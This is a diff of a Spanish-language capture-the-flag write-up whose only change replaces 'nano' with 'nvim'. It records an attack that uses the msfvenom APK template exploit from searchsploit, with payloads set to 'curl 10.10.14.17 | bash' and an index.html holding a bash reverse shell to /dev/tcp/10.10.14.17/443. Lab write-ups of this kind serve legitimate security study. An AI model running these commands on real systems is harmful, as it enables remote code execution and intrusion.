@@ -24,7 +24,7 @@ Miramos la pagina Web en ese puerto especifico, y encontramos que:
 
 - Comando -> **searchsploit msfvenom** Para buscar vulnerabilidades asociadas con msfvenom, y encontramos una que te crea un APK malicioso
 - Comando -> **searchsploit -m msfvenom** Nos traemos el exploit **.py** a nuestra maquina, despues lo miramos con **cat** y en una parte del exploit lo modificamos de la siguiente manera en la parte de payload: 
-	nano msfvenom.py
+	nvim msfvenom.py
 		**payload = 'ping -c 1 10.10.14.17'** Haremos que nos ejecute un ping a nuestra maquina
 	
 - Comando -> **python3 msfvenom.py** Al momento de ejecutarlo nos crea la aplicacion APK  
@@ -33,13 +33,13 @@ El APK lo cargamos en la pagina Web en la parte de browse, antes de ejecutarlo n
 - Comando -> **tcpsump -i tun0 icmp -n** Nos ponemos en escucha para trazas icmp y asi recibir el ping y recibimos los ping
 
 Nos damos cuenta que tenemos ejecucion remota de comandos, por lo que nos creamos un archivo asi:
-	nano index.html
+	nvim index.html
 		**#!/bin/bash/**
 		**bash -i >& /dev/tcp/10.10.14.17/443 0>&1**
 - Comando -> **python3 -m http.server 80** Nos compartimos un servidos http por el puerto 80, para que nos puedan hacer el curl
 
 Volvemos a modificar el **msfvenom** de la siguiente manera en la parte de payload: 
-	nano msfvenom.py
+	nvim msfvenom.py
 		**payload = 'curl 10.10.14.17 | bash'** Haremos que nos ejecute un curl a nuestra maquina, el cual buscara el index.html que habiamos creado
 	
 - Comando -> **python3 msfvenom.py** Al momento de ejecutarlo nos crea la aplicacion APK
